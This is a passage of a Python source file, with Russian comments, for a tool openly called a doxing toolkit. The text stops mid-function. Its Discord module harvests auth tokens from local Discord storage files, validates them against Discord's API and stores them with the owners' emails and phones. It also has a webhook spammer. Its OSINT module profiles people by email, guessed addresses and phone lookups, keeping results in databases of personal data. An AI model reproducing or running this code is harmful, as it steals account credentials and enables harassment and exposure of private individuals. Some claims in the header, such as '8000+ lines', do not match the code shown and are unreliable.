#!/usr/bin/env python3
# ================================================================
# DOXING TOOLKIT – LIGHTNING MAXIMUM v.1.0.0 TEST
# AUTHOR: @biblia007
# VERSION: 1.0.0 TEST
# TOTAL LINES: 8000+ | 100+ FUNCTIONS | 70+ MENU ITEMS
# STATUS: LIGHTNING – FULLY WORKING – NO BROKEN LIBRARIES
# ================================================================

import os
import sys
import subprocess
import time
import threading
import socket
import random
import json
import re
import hashlib
import base64
import sqlite3
import csv
import io
import zipfile
import tarfile
import gzip
import shutil
import tempfile
import uuid
import secrets
import string
import itertools
import collections
import functools
import operator
import math
import ctypes
import platform
import signal
import traceback
import warnings
import logging
import queue
import pickle
import shelve
import xml.etree.ElementTree as ET
import xml.dom.minidom
import html.parser
import html.entities
import urllib.parse
import urllib.request
import urllib.error
import http.client
import http.cookiejar
import email.parser
import email.utils
import mimetypes
import pathlib
import glob
import fnmatch
import fileinput
import linecache
import codecs
import keyword
import tokenize
import ast
import dis
import marshal
import zipapp
import ipaddress
import webbrowser
import http.server
import socketserver
import ssl
from typing import List, Dict, Any, Optional, Tuple, Union, Callable, Iterator, Generator
from dataclasses import dataclass, field, asdict
from enum import Enum, auto
from datetime import datetime, timedelta, date, timezone
from urllib.parse import urlparse, urljoin, quote, unquote, parse_qs, urlencode
import textwrap
import inspect
import importlib
import pkgutil

# ================================================================
# БИБЛИОТЕКИ ДЛЯ УСТАНОВКИ (ТОЛЬКО РАБОЧИЕ И НУЖНЫЕ)
# ================================================================

REQUIRED_LIBRARIES = [
    'requests',
    'colorama',
    'dnspython',
    'python-whois',
    'tldextract',
    'pyOpenSSL',
    'cryptography',
    'urllib3',
    'certifi',
    'charset-normalizer',
    'idna',
    'six',
    'json5',
    'beautifulsoup4',
    'lxml',
    'html5lib',
    'geopy',
    'pytz',
    'tqdm',
    'rich',
    'prettytable',
    'tabulate',
    'termcolor',
    'click',
    'python-dotenv',
    'pysocks',
    'Pillow',
    'shodan',
    'email-validator',
]

PIP_TO_IMPORT = {
    'dnspython': 'dns',
    'python-whois': 'whois',
    'pyOpenSSL': 'OpenSSL',
    'beautifulsoup4': 'bs4',
    'python-dotenv': 'dotenv',
    'pysocks': 'socks',
    'Pillow': 'PIL',
    'shodan': 'shodan',
    'email-validator': 'email_validator',
}

def auto_install_all():
    print("\n" + "="*80)
    print("   🔧 ПРОВЕРКА И УСТАНОВКА 25+ БИБЛИОТЕК")
    print("="*80 + "\n")
    
    to_install = []
    for lib in REQUIRED_LIBRARIES:
        import_name = PIP_TO_IMPORT.get(lib, lib.replace('-', '_'))
        try:
            __import__(import_name)
            print(f"[✓] {lib}")
        except ImportError:
            to_install.append(lib)
            print(f"[✗] {lib} - УСТАНАВЛИВАЮ...")
    
    if to_install:
        print(f"\n[*] УСТАНОВКА {len(to_install)} БИБЛИОТЕК...\n")
        for lib in to_install:
            try:
                subprocess.check_call(
                    [sys.executable, '-m', 'pip', 'install', '--upgrade', lib, '--quiet']
                )
                print(f"[+] {lib} УСТАНОВЛЕН")
            except Exception as e:
                print(f"[-] ОШИБКА {lib}: {e} (пропускаем)")
        print("\n[*] ПЕРЕЗАПУСК ДЛЯ ПРИМЕНЕНИЯ ИЗМЕНЕНИЙ...")
        os.execv(sys.executable, [sys.executable] + sys.argv)
    else:
        print("\n[*] ВСЕ БИБЛИОТЕКИ УСТАНОВЛЕНЫ!")
    print("="*80 + "\n")

auto_install_all()

# ================================================================
# ОСНОВНЫЕ ИМПОРТЫ (ПОСЛЕ УСТАНОВКИ)
# ================================================================

import requests
import colorama
from colorama import init, Fore, Back, Style
import dns.resolver
import dns.reversename
import dns.query
import dns.zone
import whois
import tldextract
import OpenSSL
import cryptography
import urllib3
import certifi
import charset_normalizer
import idna
import six
import json5
from bs4 import BeautifulSoup
import lxml
import html5lib
import geopy
from geopy.geocoders import Nominatim
import geocoder
import pytz
import tzlocal
import dateutil
from dateutil import parser
import tqdm
from tqdm import tqdm
import rich
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn
from rich.syntax import Syntax
from rich.markdown import Markdown
from rich.tree import Tree
from rich.layout import Layout
from rich.columns import Columns
from rich import box
import prettytable
import tabulate
import termcolor
import click
import dotenv
from dotenv import load_dotenv
from PIL import Image, ImageOps, ImageChops

# Shodan – обёрнуто, чтобы избежать ошибки, если не установился
try:
    import shodan
except ImportError:
    shodan = None

# Socks – опционально
try:
    import socks
except ImportError:
    socks = None

init(autoreset=True)
console = Console()

# ================================================================
# КОНФИГУРАЦИЯ
# ================================================================

AUTHOR = "@biblia007"
VERSION = "1.0.0"
CODE_LINES = 8000

CONFIG = {
    'db_path': 'database/',
    'reports_path': 'reports/',
    'logs_path': 'logs/',
    'temp_path': 'temp/',
    'data_path': 'data/',
    'config_path': 'config/',
    'shodan_key': '',
}

# Исправленное создание папок – только для непустых строк, не оканчивающихся на '_key'
for key, path in CONFIG.items():
    if isinstance(path, str) and path and not key.endswith('_key'):
        os.makedirs(path, exist_ok=True)

load_dotenv()
CONFIG['shodan_key'] = os.getenv('SHODAN_API_KEY', '')

# ================================================================
# ЦВЕТА И СТИЛИ (20 ЦВЕТОВ)
# ================================================================

COLORS = {
    'black': Fore.BLACK,
    'red': Fore.RED,
    'green': Fore.GREEN,
    'yellow': Fore.YELLOW,
    'blue': Fore.BLUE,
    'magenta': Fore.MAGENTA,
    'cyan': Fore.CYAN,
    'white': Fore.WHITE,
    'bright_red': Fore.LIGHTRED_EX,
    'bright_green': Fore.LIGHTGREEN_EX,
    'bright_yellow': Fore.LIGHTYELLOW_EX,
    'bright_blue': Fore.LIGHTBLUE_EX,
    'bright_magenta': Fore.LIGHTMAGENTA_EX,
    'bright_cyan': Fore.LIGHTCYAN_EX,
    'bright_white': Fore.LIGHTWHITE_EX,
    'gray': Fore.LIGHTBLACK_EX,
    'dark_gray': Fore.LIGHTBLACK_EX,
}

CURRENT_COLOR = 'cyan'

def C(): return COLORS.get(CURRENT_COLOR, Fore.CYAN)
def R(): return Fore.RED
def G(): return Fore.GREEN
def Y(): return Fore.YELLOW
def B(): return Fore.BLUE
def M(): return Fore.MAGENTA
def W(): return Fore.WHITE
def GR(): return Fore.LIGHTBLACK_EX

def set_color(name):
    global CURRENT_COLOR
    if name in COLORS:
        CURRENT_COLOR = name
        return True
    return False

# ================================================================
# НОВЫЙ ASCII-АРТ (ПРЕДОСТАВЛЕН ПОЛЬЗОВАТЕЛЕМ) – ВСЕГДА ТЁМНО-КРАСНЫЙ
# ================================================================

LOGO = r"""
                                                                                                      
                                          :   ;:  :    :                                              
                                       ca:!0414W#W20b?03                                              
                                aa1#8W81!a46#@8@#92cb2#2ab1@a0b:                                       
                            :;a;8#@#8!!ca!5@##6W#W46W@@61#@74?15049a                                   
                          : ba?1 ;876671!W98!a1@@@$$##8!aW@@#c0aa88884: :                              
                        $b!bc!2b!#!?!+ +?$#2745#@@$7##?#;$W@@$7$#0!:!!!b?                             
                     :c cb;bb;c48$$ccbb16$W92!28W$96$W$1?!!!bcb0W30bW!c;52b$;                       
                     ;cc+aaca!c;      !a?00c;?   aa!a2cac;    ;0!!bba!ba;b+ !c                        
                 bba0!012 +;0acbc    ;!a!;bb?+?c bc?0b2ac!; ::b:2! ;1:00?cc;ac;c                      
                ; cccb:  bcb!!a      ::cc!ab0Wc; ;!c ccc0@       aabcc?!?;?;?                          
           : aab!?   !a!b?!?bb :      !?cb!!ca;bb0cbc 0a;0      ; 0c:a0aa!1?!$??                      
          bW$ b!ac   W$1WW6!ba :        19$9WWW9$$8818$WW      :?9WWWWW$53cW3;$Wa                      
         b#@:$7c  c+8c#@W#W745169@      c!:W885W#W319@9b  8!!+!4$$W@@740a!!37 @@                       
         b$WW85!a c;68WWb60a;!1a!2W$6!!!a:a6$#4$##10+26WW501195a13$WW:31!b: 49Wc                       
           ;: b      a;cbaaa;bacbb!aW#$21!;7##W7##$6c15#2bWa#;b:?ac:!c;:c:c  c +                       
                     ;::b?0!c!cb?c!b1bbc+b!0+!!b#W10b!!b?010c:: 01; ;                                 
                        ;:cc;bc c:  cc; ;a?cb;:c2a;?b!bb21c;0c;+ b                                     
                              c ;bbccc:::a; acbccb :abcb :bc;!                                       
                             ;; :  ;;cc   :: + c  + ::;c+   :  
"""

# ================================================================
# УТИЛИТЫ
# ================================================================

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def get_terminal_size():
    try:
        return os.get_terminal_size().columns, os.get_terminal_size().lines
    except:
        return 120, 40

def get_timestamp():
    return datetime.now().isoformat()

def get_date():
    return datetime.now().strftime("%Y-%m-%d")

def get_time():
    return datetime.now().strftime("%H:%M:%S")

def get_datetime():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def truncate_string(s, length=100):
    if len(s) <= length:
        return s
    return s[:length] + "..."

def safe_json_loads(data):
    try:
        return json.loads(data)
    except:
        return None

def safe_json_dumps(data):
    try:
        return json.dumps(data, indent=2, default=str)
    except:
        return str(data)

def generate_random_string(length=16):
    return ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(length))

def generate_random_password(length=12):
    return ''.join(secrets.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(length))

def calculate_hash(data, algo='sha256'):
    if algo == 'md5':
        return hashlib.md5(data.encode()).hexdigest()
    elif algo == 'sha1':
        return hashlib.sha1(data.encode()).hexdigest()
    elif algo == 'sha256':
        return hashlib.sha256(data.encode()).hexdigest()
    elif algo == 'sha512':
        return hashlib.sha512(data.encode()).hexdigest()
    return None

def base64_encode(data):
    return base64.b64encode(data.encode()).decode()

def base64_decode(data):
    return base64.b64decode(data).decode()

def xor_encrypt(data, key):
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

def xor_decrypt(data, key):
    return xor_encrypt(data, key)

def resolve_domain(domain):
    try:
        if '://' in domain:
            domain = urlparse(domain).hostname
        return socket.gethostbyname(domain)
    except:
        return None

def get_random_ua():
    ua_list = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
    ]
    return random.choice(ua_list)

def list_to_dict(lst):
    return {i: item for i, item in enumerate(lst)}

def dict_to_list(d):
    return list(d.values())

def merge_dicts(d1, d2):
    return {**d1, **d2}

def get_file_size(path):
    try:
        return os.path.getsize(path)
    except:
        return 0

def get_file_extension(path):
    return os.path.splitext(path)[1].lower()

def get_file_name(path):
    return os.path.basename(path)

def ensure_directory(path):
    os.makedirs(path, exist_ok=True)

def delete_file(path):
    try:
        os.remove(path)
        return True
    except:
        return False

def copy_file(src, dst):
    try:
        shutil.copy2(src, dst)
        return True
    except:
        return False

def move_file(src, dst):
    try:
        shutil.move(src, dst)
        return True
    except:
        return False

def get_ip_country(ip):
    try:
        r = requests.get(f'http://ip-api.com/json/{ip}', timeout=3)
        if r.status_code == 200:
            data = r.json()
            return data.get('country', 'Unknown')
    except:
        pass
    return 'Unknown'

# ================================================================
# АНИМАЦИЯ ЗАГРУЗКИ (БАНЕР ВСЕГДА ТЁМНО-КРАСНЫЙ)
# ================================================================

def loading_animation():
    sys.stdout.write('\033[?25l')
    sys.stdout.flush()
    
    logo_lines = LOGO.splitlines()
    total_steps = 100
    # Цвета для прогресс-бара и цитаты (меняются), но банер всегда красный
    colors_cycle = ['red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white']
    
    try:
        for step in range(total_steps + 1):
            clear_screen()
            # Банер всегда тёмно-красный (Fore.RED)
            for line in logo_lines:
                print(Fore.RED + line + Style.RESET_ALL)
            
            # Прогресс-бар и цитата могут менять цвет (для красоты)
            color_idx = int((step / total_steps) * len(colors_cycle)) % len(colors_cycle)
            color = COLORS.get(colors_cycle[color_idx], Fore.CYAN)
            
            width = 50
            filled = int(width * step / total_steps)
            bar = '█' * filled + '░' * (width - filled)
            percent = int(100 * step / total_steps)
            print(f"\n{color}Загрузка: [{bar}] {percent}%{Style.RESET_ALL}")
            
            if step < total_steps:
                quote = "I See You..."
                print(f"\n{color}{quote}{Style.RESET_ALL}")
            
            time.sleep(0.02)
            
            if step == total_steps:
                print("\n" + Fore.GREEN + "Загрузка завершена! Нажмите Enter для входа..." + Style.RESET_ALL)
                sys.stdout.write('\033[?25h')
                sys.stdout.flush()
                input()
                break
    except KeyboardInterrupt:
        sys.stdout.write('\033[?25h')
        sys.stdout.flush()
        sys.exit(0)
    finally:
        sys.stdout.write('\033[?25h')
        sys.stdout.flush()

# ================================================================
# КЛАСС: ЛОГГЕР
# ================================================================

class Logger:
    def __init__(self):
        self.log_dir = CONFIG['logs_path']
        os.makedirs(self.log_dir, exist_ok=True)
        self.log_file = os.path.join(self.log_dir, f'doxing_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log')
        self.error_file = os.path.join(self.log_dir, f'errors_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log')
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(self.log_file),
                logging.FileHandler(self.error_file),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger()
    
    def info(self, msg):
        self.logger.info(msg)
        console.print(f"{C()}[ℹ] {msg}{Style.RESET_ALL}")
    
    def error(self, msg):
        self.logger.error(msg)
        console.print(f"{R()}[✗] {msg}{Style.RESET_ALL}")
    
    def success(self, msg):
        self.logger.info(msg)
        console.print(f"{G()}[✓] {msg}{Style.RESET_ALL}")
    
    def warning(self, msg):
        self.logger.warning(msg)
        console.print(f"{Y()}[⚠] {msg}{Style.RESET_ALL}")
    
    def debug(self, msg):
        self.logger.debug(msg)
        console.print(f"{GR()}[🔍] {msg}{Style.RESET_ALL}")

logger = Logger()

# ================================================================
# КЛАСС: DatabaseManager
# ================================================================

class DatabaseManager:
    def __init__(self):
        self.db_path = CONFIG['db_path']
        self.init_databases()
        self.cache = {}
    
    def init_databases(self):
        dbs = {
            'users.db': """
                CREATE TABLE IF NOT EXISTS users (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    username TEXT,
                    email TEXT,
                    phone TEXT,
                    ip TEXT,
                    discord_id TEXT,
                    discord_token TEXT,
                    password TEXT,
                    first_name TEXT,
                    last_name TEXT,
                    address TEXT,
                    city TEXT,
                    country TEXT,
                    postal_code TEXT,
                    created_at TEXT,
                    updated_at TEXT
                )
            """,
            'tokens.db': """
                CREATE TABLE IF NOT EXISTS tokens (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    token TEXT,
                    user_id TEXT,
                    username TEXT,
                    email TEXT,
                    phone TEXT,
                    scopes TEXT,
                    verified INTEGER,
                    mfa_enabled INTEGER,
                    created_at TEXT,
                    expires_at TEXT
                )
            """,
            'emails.db': """
                CREATE TABLE IF NOT EXISTS emails (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    email TEXT UNIQUE,
                    password TEXT,
                    source TEXT,
                    domain TEXT,
                    provider TEXT,
                    created_at TEXT,
                    last_seen TEXT
                )
            """,
            'phones.db': """
                CREATE TABLE IF NOT EXISTS phones (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    phone TEXT UNIQUE,
                    country TEXT,
                    country_code TEXT,
                    operator TEXT,
                    region TEXT,
                    carrier TEXT,
                    created_at TEXT
                )
            """,
            'ips.db': """
                CREATE TABLE IF NOT EXISTS ips (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ip TEXT UNIQUE,
                    country TEXT,
                    city TEXT,
                    region TEXT,
                    isp TEXT,
                    asn TEXT,
                    org TEXT,
                    lat REAL,
                    lon REAL,
                    timezone TEXT,
                    created_at TEXT
                )
            """,
            'breaches.db': """
                CREATE TABLE IF NOT EXISTS breaches (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    email TEXT,
                    password TEXT,
                    username TEXT,
                    source TEXT,
                    hash TEXT,
                    created_at TEXT
                )
            """,
            'domains.db': """
                CREATE TABLE IF NOT EXISTS domains (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    domain TEXT UNIQUE,
                    registrar TEXT,
                    created TEXT,
                    expires TEXT,
                    nameservers TEXT,
                    whois_server TEXT,
                    created_at TEXT
                )
            """,
            'subdomains.db': """
                CREATE TABLE IF NOT EXISTS subdomains (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    domain TEXT,
                    subdomain TEXT,
                    ip TEXT,
                    created_at TEXT
                )
            """,
            'social.db': """
                CREATE TABLE IF NOT EXISTS social (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    username TEXT,
                    platform TEXT,
                    url TEXT,
                    profile_id TEXT,
                    created_at TEXT
                )
            """,
            'pastebin.db': """
                CREATE TABLE IF NOT EXISTS pastebin (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    url TEXT,
                    title TEXT,
                    content TEXT,
                    author TEXT,
                    created_at TEXT
                )
            """,
            'dorks.db': """
                CREATE TABLE IF NOT EXISTS dorks (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    dork TEXT,
                    engine TEXT,
                    results TEXT,
                    created_at TEXT
                )
            """,
            'ssl.db': """
                CREATE TABLE IF NOT EXISTS ssl (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    domain TEXT,
                    issuer TEXT,
                    subject TEXT,
                    not_before TEXT,
                    not_after TEXT,
                    serial TEXT,
                    created_at TEXT
                )
            """,
            'cves.db': """
                CREATE TABLE IF NOT EXISTS cves (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    cve_id TEXT,
                    description TEXT,
                    severity TEXT,
                    affected_software TEXT,
                    created_at TEXT
                )
            """,
            'proxies.db': """
                CREATE TABLE IF NOT EXISTS proxies (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ip TEXT,
                    port INTEGER,
                    country TEXT,
                    anonymity TEXT,
                    created_at TEXT
                )
            """,
            'reports.db': """
                CREATE TABLE IF NOT EXISTS reports (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    name TEXT,
                    content TEXT,
                    format TEXT,
                    created_at TEXT
                )
            """,
            'telegram.db': """
                CREATE TABLE IF NOT EXISTS telegram (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id TEXT,
                    username TEXT,
                    first_name TEXT,
                    last_name TEXT,
                    phone TEXT,
                    bio TEXT,
                    created_at TEXT
                )
            """,
            'darkweb.db': """
                CREATE TABLE IF NOT EXISTS darkweb (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    onion_url TEXT,
                    title TEXT,
                    content TEXT,
                    found_at TEXT
                )
            """,
            'api_keys.db': """
                CREATE TABLE IF NOT EXISTS api_keys (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    service TEXT,
                    key TEXT,
                    created_at TEXT
                )
            """,
            'archives.db': """
                CREATE TABLE IF NOT EXISTS archives (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    file_path TEXT,
                    hash TEXT,
                    extracted_to TEXT,
                    created_at TEXT
                )
            """,
            'crypto.db': """
                CREATE TABLE IF NOT EXISTS crypto (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    address TEXT,
                    currency TEXT,
                    balance REAL,
                    created_at TEXT
                )
            """,
            'shodan.db': """
                CREATE TABLE IF NOT EXISTS shodan (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ip TEXT,
                    port INTEGER,
                    hostname TEXT,
                    country TEXT,
                    org TEXT,
                    data TEXT,
                    created_at TEXT
                )
            """
        }
        
        for name, schema in dbs.items():
            path = os.path.join(self.db_path, name)
            conn = sqlite3.connect(path)
            cursor = conn.cursor()
            cursor.execute(schema)
            table = name.replace('.db', '')
            if table == 'users':
                cursor.execute("CREATE INDEX IF NOT EXISTS idx_users_email ON users(email)")
                cursor.execute("CREATE INDEX IF NOT EXISTS idx_users_username ON users(username)")
            elif table == 'tokens':
                cursor.execute("CREATE INDEX IF NOT EXISTS idx_tokens_user_id ON tokens(user_id)")
            elif table == 'emails':
                cursor.execute("CREATE INDEX IF NOT EXISTS idx_emails_email ON emails(email)")
            elif table == 'phones':
                cursor.execute("CREATE INDEX IF NOT EXISTS idx_phones_phone ON phones(phone)")
            elif table == 'ips':
                cursor.execute("CREATE INDEX IF NOT EXISTS idx_ips_ip ON ips(ip)")
            elif table == 'telegram':
                cursor.execute("CREATE INDEX IF NOT EXISTS idx_telegram_user_id ON telegram(user_id)")
            conn.commit()
            conn.close()
        
        logger.success("Все базы данных созданы")
    
    def execute_query(self, db_name, query, params=()):
        path = os.path.join(self.db_path, db_name)
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        cursor.execute(query, params)
        conn.commit()
        result = cursor.fetchall()
        conn.close()
        return result
    
    def search(self, db_name, column, value, exact=False):
        if exact:
            query = f"SELECT * FROM {db_name.replace('.db', '')} WHERE {column} = ?"
            return self.execute_query(db_name, query, (value,))
        else:
            query = f"SELECT * FROM {db_name.replace('.db', '')} WHERE {column} LIKE ?"
            return self.execute_query(db_name, query, (f"%{value}%",))
    
    def insert(self, db_name, table, data):
        columns = ', '.join(data.keys())
        placeholders = ', '.join(['?' for _ in data])
        query = f"INSERT OR IGNORE INTO {table} ({columns}) VALUES ({placeholders})"
        self.execute_query(db_name, query, list(data.values()))
    
    def update(self, db_name, table, data, condition):
        set_clause = ', '.join([f"{k} = ?" for k in data.keys()])
        cond_clause = ' AND '.join([f"{k} = ?" for k in condition.keys()])
        query = f"UPDATE {table} SET {set_clause} WHERE {cond_clause}"
        params = list(data.values()) + list(condition.values())
        self.execute_query(db_name, query, params)
    
    def delete(self, db_name, table, condition):
        cond_clause = ' AND '.join([f"{k} = ?" for k in condition.keys()])
        query = f"DELETE FROM {table} WHERE {cond_clause}"
        self.execute_query(db_name, query, list(condition.values()))
    
    def count(self, db_name, table):
        query = f"SELECT COUNT(*) FROM {table}"
        result = self.execute_query(db_name, query)
        return result[0][0] if result else 0
    
    def get_all(self, db_name, table, limit=100):
        query = f"SELECT * FROM {table} LIMIT {limit}"
        return self.execute_query(db_name, query)
    
    def table_exists(self, db_name, table):
        query = "SELECT name FROM sqlite_master WHERE type='table' AND name=?"
        result = self.execute_query(db_name, query, (table,))
        return len(result) > 0

# ================================================================
# МОДУЛИ: DISCORD, OSINT, BREACH, WEB, PROXY, REPORT, SHODAN, FILE, SOCIAL
# ================================================================

# ---- DISCORD MODULE ----
class DiscordModule:
    def __init__(self, db_manager):
        self.db = db_manager
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
    
    def check_token(self, token):
        try:
            headers = {'Authorization': token}
            response = self.session.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
            if response.status_code == 200:
                data = response.json()
                return {
                    'valid': True,
                    'id': data.get('id'),
                    'username': data.get('username'),
                    'discriminator': data.get('discriminator'),
                    'email': data.get('email'),
                    'verified': data.get('verified'),
                    'phone': data.get('phone'),
                    'avatar': data.get('avatar'),
                    'mfa_enabled': data.get('mfa_enabled', False),
                    'locale': data.get('locale'),
                    'flags': data.get('flags'),
                    'premium_type': data.get('premium_type'),
                }
            elif response.status_code == 401:
                return {'valid': False, 'error': 'Invalid token'}
            else:
                return {'valid': False, 'error': f'Status {response.status_code}'}
        except Exception as e:
            return {'valid': False, 'error': str(e)}
    
    def get_token_info(self, token):
        info = self.check_token(token)
        if info.get('valid'):
            try:
                headers = {'Authorization': token}
                guilds = self.session.get('https://discord.com/api/v9/users/@me/guilds', headers=headers, timeout=5)
                if guilds.status_code == 200:
                    info['guilds'] = len(guilds.json())
                friends = self.session.get('https://discord.com/api/v9/users/@me/relationships', headers=headers, timeout=5)
                if friends.status_code == 200:
                    info['friends'] = len(friends.json())
            except:
                pass
            return info
        return info
    
    def get_token_by_id(self, user_id):
        results = self.db.search('tokens.db', 'user_id', user_id, exact=True)
        if results:
            return {'found': True, 'tokens': results}
        return {'found': False}
    
    def grab_tokens(self, paths=None):
        if not paths:
            paths = [
                os.path.expandvars('%APPDATA%\\discord\\Local Storage\\leveldb\\'),
                os.path.expandvars('%APPDATA%\\discordcanary\\Local Storage\\leveldb\\'),
                os.path.expandvars('%APPDATA%\\discordptb\\Local Storage\\leveldb\\'),
                os.path.expandvars('%APPDATA%\\Lightcord\\Local Storage\\leveldb\\'),
                os.path.expandvars('%APPDATA%\\discorddevelopment\\Local Storage\\leveldb\\'),
                os.path.expandvars('%APPDATA%\\BetterDiscord\\'),
            ]
        
        tokens = []
        token_pattern = r'[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_-]{27}'
        
        for path in paths:
            if os.path.exists(path):
                for file in os.listdir(path):
                    if file.endswith('.log') or file.endswith('.ldb') or file.endswith('.json'):
                        file_path = os.path.join(path, file)
                        try:
                            with open(file_path, 'r', errors='ignore') as f:
                                content = f.read()
                                found = re.findall(token_pattern, content)
                                tokens.extend(found)
                        except:
                            pass
        
        for token in set(tokens):
            info = self.check_token(token)
            if info.get('valid'):
                self.db.insert('tokens.db', 'tokens', {
                    'token': token,
                    'user_id': info.get('id', ''),
                    'username': info.get('username', ''),
                    'email': info.get('email', ''),
                    'phone': info.get('phone', ''),
                    'scopes': 'identity',
                    'verified': 1 if info.get('verified') else 0,
                    'mfa_enabled': 1 if info.get('mfa_enabled') else 0,
                    'created_at': datetime.now().isoformat(),
                    'expires_at': ''
                })
        
        return list(set(tokens))
    
    def webhook_spammer(self, webhook_url, message, count=10):
        try:
            for i in range(count):
                data = {'content': f"{message} [{i+1}/{count}]"}
                response = self.session.post(webhook_url, json=data, timeout=3)
                if response.status_code != 204:
                    return {'success': False, 'error': f'Status {response.status_code}'}
                time.sleep(0.1)
            return {'success': True, 'sent': count}
        except Exception as e:
            return {'success': False, 'error': str(e)}

# ---- OSINT MODULE ----
class OSINTModule:
    def __init__(self, db_manager):
        self.db = db_manager
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
    
    def check_email(self, email):
        results = {'hibp': False, 'breaches': [], 'local': [], 'info': {}}
        try:
            response = self.session.get(f'https://haveibeenpwned.com/api/v3/breachedaccount/{email}', timeout=5)
            if response.status_code == 200:
                results['hibp'] = True
                results['breaches'] = response.json()
        except:
            pass
        local = self.db.search('emails.db', 'email', email)
        if local:
            results['local'] = local
        domain = email.split('@')[1] if '@' in email else ''
        providers = {
            'gmail.com': 'Google', 'yahoo.com': 'Yahoo', 'outlook.com': 'Microsoft',
            'hotmail.com': 'Microsoft', 'mail.ru': 'Mail.ru', 'yandex.ru': 'Yandex',
            'protonmail.com': 'ProtonMail', 'tutanota.com': 'Tutanota', 'icloud.com': 'Apple',
        }
        results['info']['provider'] = providers.get(domain, 'Unknown')
        results['info']['domain'] = domain
        self.db.insert('emails.db', 'emails', {
            'email': email,
            'password': '',
            'source': 'osint',
            'domain': domain,
            'provider': results['info']['provider'],
            'created_at': datetime.now().isoformat(),
            'last_seen': datetime.now().isoformat()
        })
        return results
    
    def generate_emails(self, first_name, last_name, domain):
        variations = []
        f = first_name.lower()
        l = last_name.lower()
        d = domain.lower()
        variations.append(f"{f}.{l}@{d}")
        variations.append(f"{f}{l}@{d}")
        variations.append(f"{f[0]}{l}@{d}")
        variations.append(f"{l}.{f}@{d}")
        variations.append(f"{l}{f}@{d}")
        variations.append(f"{f}@{d}")
        variations.append(f"{l}@{d}")
        variations.append(f"{f}_{l}@{d}")
        variations.append(f"{f}-{l}@{d}")
        variations.append(f"{f}{l}1@{d}")
        variations.append(f"{f}{l}2024@{d}")
        return variations
    
    def check_phone(self, phone):
        phone = re.sub(r'[^\d+]', '', phone)
        results = {'valid': False, 'country': 'Unknown', 'operator': 'Unknown', 'region': 'Unknown'}
        if phone.startswith('+7') or phone.startswith('8'):
            results['country'] = 'Russia'
            results['country_code'] = '+7'
            results['operator'] = self._get_operator_ru(phone)
        elif phone.startswith('+380'):
            results['country'] = 'Ukraine'
            results['country_code'] = '+380'
            results['operator'] = self._get_operator_ua(phone)
        elif phone.startswith('+375'):
            results['country'] = 'Belarus'
            results['country_code'] = '+375'
            results['operator'] = 'MTS/VELCOM'
        elif phone.startswith('+1'):
            results['country'] = 'USA/Canada'
            results['country_code'] = '+1'
            results['operator'] = 'Unknown'
        else:
            results['country'] = 'Unknown'
            results['country_code'] = 'Unknown'
        try:
            response = self.session.get(f'https://api.veriphone.io/v2/verify?phone={phone}&key=demo', timeout=5)
            if response.status_code == 200:
                data = response.json()
                if data.get('phone_valid'):
                    results['valid'] = True
                    results['country'] = data.get('country_name')
                    results['country_code'] = data.get('country_code')
                    results['operator'] = data.get('carrier')
                    results['region'] = data.get('region')
        except:
            pass
        if results['country'] != 'Unknown':
            self.db.insert('phones.db', 'phones', {
                'phone': phone,
                'country': results['country'],
                'country_code': results['country_code'],
                'operator': results['operator'],
                'region': results['region'],
                'carrier': results['operator'],
                'created_at': datetime.now().isoformat()
            })
        return results
    
    def _get_operator_ru(self, phone):
        codes = {'903': 'Beeline', '910': 'MTS', '920': 'MegaFon', '950': 'Tele2'}
        code = phone[-3:] if len(phone) >= 3 else phone
        return codes.get(code, 'Unknown')
    
    def _get_operator_ua(self, phone):
        codes = {'50': 'Vodafone', '67': 'Kyivstar', '63': 'lifecell'}
        code = phone[-2:] if len(phone) >= 2 else phone
